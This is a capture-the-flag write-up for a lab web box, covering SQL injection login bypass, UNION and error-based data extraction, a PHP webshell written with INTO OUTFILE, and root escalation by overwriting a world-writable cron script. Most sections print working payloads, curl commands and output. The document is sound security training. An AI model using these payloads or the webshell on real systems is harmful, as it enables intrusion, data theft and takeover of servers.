---
layout: post
title: "Query Quake"
description: "CTF writeup for NexaTech Solutions: bypassing a login with a UNION-based MySQL injection, turning it into RCE by writing a PHP webshell with INTO OUTFILE to grab the user flag, then escalating to root by overwriting a world-writable supervisord.cron script that cron runs as root to read the root flag."
category: hackerdna
tags: [web, ctf, hackerdna, sql-injection, union-based, error-based, mysqli, rce, into-outfile, webshell, cron, privilege-escalation, mariadb]
---

## Query Quake - CTF Writeup

**Category:** WEB | **Flags:** 2 (User / Root)

Challenge: [https://hackerdna.com/labs/query-quake](https://hackerdna.com/labs/query-quake)

## Contents

- [Reconnaissance](#reconnaissance)
- [SQL Injection: Auth Bypass](#sql-injection-auth-bypass)
- [Fingerprinting the Injection](#fingerprinting-the-injection)
- [Error-Based Data Extraction](#error-based-data-extraction)
- [RCE via INTO OUTFILE Web Shell](#rce-via-into-outfile-web-shell)
- [User Flag](#user-flag)
- [Privilege Escalation: Writable Cron Script](#privilege-escalation-writable-cron-script)

## Reconnaissance

NexaTech Solutions is a plain Apache 2.4.59 (Debian) box with only port 80
open. The public site (`/`, `about.html`, `services.html`, ...) is fully
static - every form is `action="#"` and images 404.

A stack scan with `big.txt`/`common.txt` eventually surfaces the real app at
`/webadmin`:

```
301  /webadmin
```

which redirects to a `Login` page. The form posts to `/webadmin/index.php`

## SQL Injection: Auth Bypass

The login form submits `username` and `password` to `index.php`. A classic
single-quote test reveals the classic fingerprint:

```bash
curl -X POST http://TARGET/webadmin/index.php \
  -d "username=admin' OR '1'='1' -- -&password=x"
```

This logs us straight into the admin dashboard. Looking at the source
(`/var/www/html/webadmin/index.php`) confirms the vulnerable query:

```php
$sql="SELECT * FROM auth WHERE pwd='" . $_POST['password'] . "'
      AND `username`='" . $_POST['username'] . "'";
```

## Fingerprinting the Injection

`ORDER BY` reveals the result set has two columns:

```bash
username=admin' ORDER BY 1 -- -   # login page (works)
username=admin' ORDER BY 2 -- -   # login page (works)
username=admin' ORDER BY 3 -- -   # Fatal error: Unknown column '3'
```

So a UNION-based injection works with two columns:

```bash
username=x' UNION SELECT 1,2 -- -
```

The application doesn't render the selected values, so we pair UNION with
error-based extraction (`EXTRACTVALUE` triggers an XML XPATH error echoing our
expression). This confirms the backend:

```
XPATH syntax error: '~10.11.6-MariaDB-0+deb12u1'
XPATH syntax error: '~NexaTech@localhost'
```

## Error-Based Data Extraction

With `LOAD_FILE()` inside `EXTRACTVALUE`, we can read arbitrary files the
MySQL/MariaDB process can access - including the PHP source:

```sql
UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('.../index.php')))
```

The source shows the DB credentials and, more importantly, that the box
already has a helper to read the root flag:

```php
echo system('echo 1 | su -l root -c "cat /root/flag-root.txt"');
```

## RCE via INTO OUTFILE Web Shell

The DB user has `FILE` privileges with an empty `secure_file_priv`. We can
write a PHP web shell straight into the document root:

```sql
x' UNION SELECT 1,"<?php echo shell_exec($_GET['c']); ?>"
            INTO OUTFILE '/var/www/html/s.php' -- -
```

Then execute commands:

```bash
curl "http://TARGET/s.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User Flag

```bash
curl "http://TARGET/s.php?c=cat /home/flag-user.txt"
```

`flag-user.txt` is at `/home/flag-user.txt`.

## Privilege Escalation: Writable Cron Script

Enumeration as `www-data` finds a suspicious file at the filesystem root:

```
-rwx-wx-wx. 1 root root 73 May 30  2024 /supervisord.cron
```

`/supervisord.cron` is **world-writable** and executued by cron as **root**
(every minute, visible in `/supervisord.log`):

```
Tue Sep 15 11:49:01 2026 INFO success: supervisord.cron
```

Because it is world-writable, we can simply overwrite it with our own script
that copies the root flag somewhere we can read (base64 to avoid shell quoting
through the webshell):

```bash
echo "IyEvYmluL2Jhc2gKY3AgL3Jvb3QvZmxhZy1yb290..." | base64 -d > /supervisord.cron
```

The payload copies `/root/flag-root.txt` to the web root. On the next cron run
it lands as root:

```
-rw-r--r--. 1 root root 37 /var/www/html/rroot.txt
```

`flag-root.txt` is at `/root/flag-root.txt`.

## Summary

- **Vulnerabilities:** UNION + error-based MySQL injection, `INTO OUTFILE`
  web shell write (empty `secure_file_priv` + FILE privilege), and a
  world-writable root cron script.
- **Chain:** static-site springboard (`/webadmin`) -> SQLi auth bypass ->
  UNION/error-based data extraction -> `INTO OUTFILE` PHP shell ->
  `/home/flag-user.txt` -> overwrite `/supervisord.cron` (runs as root) ->
  `/root/flag-root.txt`.